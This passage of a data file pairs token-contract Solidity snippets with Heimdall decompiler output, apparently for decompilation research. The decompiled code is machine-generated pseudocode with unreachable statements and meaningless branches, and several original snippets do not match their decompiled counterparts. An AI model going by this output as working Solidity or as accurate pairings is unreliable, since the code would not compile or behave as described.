(!storage_map_b[var_a] / 0x01) {\n        }\n        if (swapV2Pair / 0x01000000000000000000000000000000000000000000) {\n            var_a = address(arg0);\n            var_b = 0x17;\n            if (!storage_map_b[var_a] / 0x01) {\n                var_a = address(msg.sender);\n                var_b = 0x17;\n                if (!storage_map_b[var_a] / 0x01) {\n                }\n            }\n            var_a = address(arg0);\n            var_b = 0x17;\n            if (storage_map_b[var_a] / 0x01) {\n            }\n            if (!swapV2Pair / 0x010000000000000000000000000000000000000000) {\n                if (!swapV2Pair / 0x010000000000000000000000000000000000000000) {\n                    if (!swapV2Pair / 0x010000000000000000000000000000000000000000) {\n                        if (!swapV2Pair / 0x010000000000000000000000000000000000000000) {\n                            require(!(!bytes1(swapV2Pair / 0x01000000000000000000000000000000000000000000)), \"Buy transfer amount exceeds the maxTradingAmount.\");\n                        }\n                    }\n                }\n            }\n        }\n        require(!(!bytes1(tradingActive / 0x0100)), \"Buy transfer amount exceeds the maxTradingAmount.\");\n        require(!(!bytes1(tradingActive / 0x0100)), \"Buy transfer amount exceeds the maxTradingAmount.\");\n        var_a = address(msg.sender);\n        var_b = 0x17;\n        require(!(bytes1(storage_map_b[var_a] / 0x01)), \"Buy transfer amount exceeds the maxTradingAmount.\");\n        require(!(arg1 > maxTradingAmount), \"Buy transfer amount exceeds the maxTradingAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x31;\n        var_h = 0x427579207472616e7366657220616d6f756e7420657863656564732074686520;\n        var_i = 0x6d617854726164696e67416d6f756e742e000000000000000000000000000000;\n        var_a = address(arg0);\n        var_b = 0x17;\n        require(!(bytes1(storage_map_b[var_a] / 0x01)), \"Sell transfer amount exceeds the maxTradingAmount.\");\n        require(!(arg1 > maxTradingAmount), \"Sell transfer amount exceeds the maxTradingAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x32;\n        var_h = 0x53656c6c207472616e7366657220616d6f756e74206578636565647320746865;\n        var_i = 0x206d617854726164696e67416d6f756e742e0000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0x16;\n        require(bytes1(storage_map_b[var_a] / 0x01), \"Trading is not active.\");\n        require(bytes1(storage_map_b[var_a] / 0x01), \"Trading is not active.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x16;\n        var_h = 0x54726164696e67206973206e6f74206163746976652e00000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0x17;\n        if (storage_map_b[var_a] / 0x01) {\n            if (!storage_map_b[var_a] / 0x01) {\n            }\n            if (!tradingActive / 0x01) {\n                require(bytes1(storage_map_b[var_a] / 0x01), \"ERC20: transfer to the zero address\");\n            }\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x9361CD557C1db79830F118364E5009B3A2738fD3", "original_solidity_code": "function transferOwnership(address _newOwner) public onlyOwner {\r\n        owner = _newOwner;\r\n        emit OwnershipTransferred(owner, _newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(address(msg.sender) == (address(owner / 0x01)));\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), address(arg0));\n    }"}
{"contract_address": "0x700604d812AD038BB5fE00ddDB8c0375E65A307C", "original_solidity_code": "function turnOnTheBurn() public onlyOwner {\r\n        burnMode = true;\r\n    }", "heimdall_decompiled_code": "function turnOnTheBurn() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        burnMode = (0x01 * 0x01000000000000000000000000000000000000000000) | (uint248(burnMode));\n    }"}
{"contract_address": "0xB14c3a406A345F2b4E79aB45d81A63E9a815ec71", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(address(msg.sender) == 0), \"ERC20: approve to the zero address\");\n        require(!(address(arg0) == 0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x22;\n        var_h = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_i = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x24;\n        var_h = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_i = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x4a4571840601e53dC0f99F0b58AdCC14B601e418", "original_solidity_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_balances[_msgSender()] >= amount, \"TT: transfer amount exceeds balance\");\r\n    _balances[_msgSender()] -= amount;\r\n    _balances[recipient] += amount;\r\n\r\n    emit Transfer(_msgSender(), recipient, amount);\r\n    return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] < arg1), \"TT: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x54543a207472616e7366657220616d6f756e7420657863656564732062616c61;\n        var_h = 0x6e63650000000000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        require(!storage_map_b[var_a] < arg1);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        var_b = 0x01;\n        require(!storage_map_b[var_a] > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - arg1));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xB1fA6eb9B56F1dC8967969e17734Ba37ddA77E86", "original_solidity_code": "function transfer(address to, uint256 amount) external returns (bool){\r\n        return _transfer(msg.sender, to, amount);\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] - arg1) > storage_map_b[var_a]);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        require(!(address(store_a)) == (address(arg0)));\n        require(!(address(store_a)) == (address(arg0)));\n        require(!(address(store_a)) == (address(arg0)));\n        require(address(this) == (address(msg.sender)));\n        require(address(store_a) == (address(msg.sender)));\n        require((0 == ((0 * arg1) / arg1)) | !arg1);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x64);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_a = address(arg0);\n        var_b = 0;\n        require(!storage_map_b[var_a] > (arg1 + storage_map_b[var_a]));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_d = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_d = 0x01;\n        return 0x01;\n        store_a = 0x010000000000000000000000000000000000000000 | (uint248(store_a));\n        var_d = 0x02;\n        uint256 var_e = var_e + 0x60;\n        var_f = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_g = address(this);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        var_h = 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2;\n        require(0x12);\n        require((0x01 == 0x01) | !0x23c34600);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x64);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_i = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_j = 0x5b8d80;\n        uint256 var_k = 0;\n        var_l = 0xa0;\n        uint256 var_m = var_e.length;\n        address var_n = address(this);\n        uint256 var_o = block.timestamp;\n        require(address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).code.length);\n        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).Unresolved_791ac947(var_j); // call\n        (bool success, bytes memory ret0) = address(0x1859905bc160f5d575165318111aa1891cb4633e).transfer(address(this).balance);\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                require(0x0a);\n                require(0x0a == 0x01);\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_c = 0x11;\n                require(0x0a == 0x02);\n                require(!0x12 > 0xff);\n                require(!((0x0a < 0x0b) & (0x12 < 0x4e)) | ((0x0a < 0x0133) & (0x12 < 0x20)));\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_c = 0x11;\n                require(!0x12 > 0x01);\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_c = 0x11;\n                require(!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999);\n            }\n            require(!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999);\n        }\n    }"}
{"contract_address": "0xEFB0c530467107677E4C214c3C444fFb282AE6F2", "original_solidity_code": "function getWinner() public view returns (address[] memory) {\\n        return winnerOfPrize;\\n     }", "heimdall_decompiled_code": "function getWinner() public view returns (bytes memory) {\n        uint256 var_a = var_a + (0x20 + (0x20 * store_i));\n        var_b = store_i;\n        if (!store_i) {\n            var_c = 0x04;\n            address var_d = address(storage_map_z[var_c]);\n            if ((0x20 + var_a) + (0x20 * store_i) > (0x20 + (0x20 + var_a))) {\n                address var_e = address(storage_map_aa[var_c]);\n                if ((0x20 + var_a) + (0x20 * store_i) > (0x20 + (0x20 + (0x20 + var_a)))) {\n                    var_d = 0x20;\n                    var_e = var_a.length;\n                    return abi.encodePacked(0x20, var_a.length);\n                }\n            }\n        }\n    }"}
{"contract_address": "0xFF5C43C4fADdF9A03BEdE1D0b276E7eC996504a1", "original_solidity_code": "function changeFee (uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner {\r\n        _redisFeeOnBuy = redisFeeOnBuy;\r\n        _redisFeeOnSell = redisFeeOnSell;\r\n        _taxFeeOnBuy = taxFeeOnBuy;\r\n        _taxFeeOnSell = taxFeeOnSell;\r\n    }", "heimdall_decompiled_code": "function changeFee(uint256 arg0, uint256 arg1, uint256 arg2, uint256 arg3) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_i = arg0;\n        store_j = arg1;\n        store_k = arg2;\n        store_l = arg3;\n    }"}
{"contract_address": "0xC1687b1453E40Bd9F46b33dFf3c6ea3A0Ea168eA", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_h) {\n            if (store_h - ((store_h / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_h / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_h / 0x02;\n                if (store_h) {\n                    if (store_h - ((store_h / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_h / 0x02) {\n                            if (0x1f < (store_h / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_h / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xB4B3Bb6137c53FCDaA2129B293c0688067146DE8", "original_solidity_code": "function openTrading() external {\r\n        require(msg.sender == deployer);\r\n        tradingOpened = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(0xfa6f3973b3d16634551d16d407cb4363294f3a7c == msg.sender);\n        store_d = 0x01 | (uint248(store_d));\n    }"}
{"contract_address": "0x2cAA87192a72dA386D615C986479a7E600EFc46f", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n        firstBlock = block.number;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_f / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_l = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_l));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x3b9aca00, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_m[var_e] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                            if (!0x09 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0x01) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xE717AFf2e3d325cb5E2c7bdB9CB916ff6AF64ec7", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + arg1)), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!((storage_map_b[var_a] + arg1) < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x1b;\n        var_h = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        require(address(msg.sender) - (address(msg.sender)));\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_a = address(arg0);\n        var_b = 0x01;\n        var_a = address(msg.sender);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(arg0), address(msg.sender), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xB9FB64018E475BBCF128E391E62274599c4D848C", "original_solidity_code": "function royaltyInfo(uint256 tokenId, uint256 salePrice)\\n        external\\n        view\\n        returns (address receiver, uint256 royaltyAmount);\\n}\\n\"\r\n    },\r\n    \"lib/openzeppelin-contracts/contracts/utils/introspection/IERC165.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Interface of the ERC165 standard, as defined in the\\n * https://eips.ethereum.org/EIPS/eip-165[EIP].\\n *\\n * Implementers can declare support of contract interfaces, which can then be\\n * queried by others ({ERC165Checker}).\\n *\\n * For an implementation, see {ERC165}.\\n */\\ninterface IERC165 {\\n    /**\\n     * @dev Returns true if this contract implements the interface defined by\\n     * `interfaceId`. See the corresponding\\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\\n     * to learn more about how these ids are created.\\n     *\\n     * This function call must use less than 30 000 gas.\\n     */\\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\\n}\\n\"\r\n    }", "heimdall_decompiled_code": "function royaltyInfo(uint256 arg0, uint256 arg1) public view returns (bytes memory) {\n        require(uint96(royaltyAddress / 0x010000000000000000000000000000000000000000) == ((uint96(royaltyAddress / 0x010000000000000000000000000000000000000000) * arg1) / arg1) | !arg1);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(0x2710);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        address var_c = address(royaltyAddress);\n        uint256 var_d = (uint96(royaltyAddress / 0x010000000000000000000000000000000000000000) * arg1) / 0x2710;\n        return abi.encodePacked(address(royaltyAddress), (uint96(royaltyAddress / 0x010000000000000000000000000000000000000000) * arg1) / 0x2710);\n    }"}
{"contract_address": "0x634190EAD9c756794D33e5C4F052774Ab41EB189", "original_solidity_code": "function removeLimits() external onlyOwner{\\r\\n        _maxTxAmount = _tTotal;\\r\\n        _maxWalletSize=_tTotal;\\r\\n        transferDelayEnabled=false;\\r\\n        emit MaxTxAmountUpdated(_tTotal);\\r\\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x3b9aca00) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x3b9aca00;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x3b9aca00) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x3b9aca00;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x3b9aca00) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x3b9aca00;\n                                emit MaxTxAmountUpdated(0x3b9aca00);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xe5E1b81693051f8692F94D537aCE52225654ffE7", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0cF6AF04E435c22D26884FAd0682E96BA150CBBb", "original_solidity_code": "function transfer(address to, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"Value exceeds balance\");\n        require(address(arg0) - 0, \"Value exceeds balance\");\n        require(!(!(address(msg.sender)) == (address(owner / 0x01))), \"Value exceeds balance\");\n        address var_a = address(msg.sender);\n        var_b = 0x97;\n        require(!(!bytes1(storage_map_d[var_a] / 0x01)), \"Value exceeds balance\");\n        require(!(!bytes1(storage_map_d[var_a] / 0x01)), \"Value exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x65;\n        require(!(storage_map_d[var_a] < arg1), \"Value exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x15;\n        var_g = 0x56616c756520657863656564732062616c616e63650000000000000000000000;\n        if (address(msg.sender) == (address(owner / 0x01))) {\n            var_a = address(msg.sender);\n            var_b = 0x97;\n            if (storage_map_d[var_a] / 0x01) {\n                if (storage_map_d[var_a] / 0x01) {\n                    var_a = address(msg.sender);\n                    var_b = 0x65;\n                    require(bytes1(storage_map_d[var_a] / 0x01));\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_h = 0x11;\n                    var_a = address(msg.sender);\n                    var_b = 0x65;\n                    storage_map_d[var_a] = storage_map_d[var_a] - arg1;\n                    var_a = address(arg0);\n                    var_b = 0x65;\n                    require(bytes1(storage_map_d[var_a] / 0x01));\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_h = 0x11;\n                    var_a = address(arg0);\n                    var_b = 0x65;\n                    storage_map_d[var_a] = storage_map_d[var_a] + arg1;\n                    uint256 var_c = arg1;\n                    emit Transfer(address(msg.sender), address(arg0), arg1);\n                    var_c = 0x01;\n                    return 0x01;\n                    require(!(storage_map_d[var_a] - arg1) > storage_map_d[var_a]);\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_h = 0x11;\n                    require(!storage_map_d[var_a] > (storage_map_d[var_a] + arg1));\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_h = 0x12;\n                    require(!(arg1) & (fee > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1)));\n                    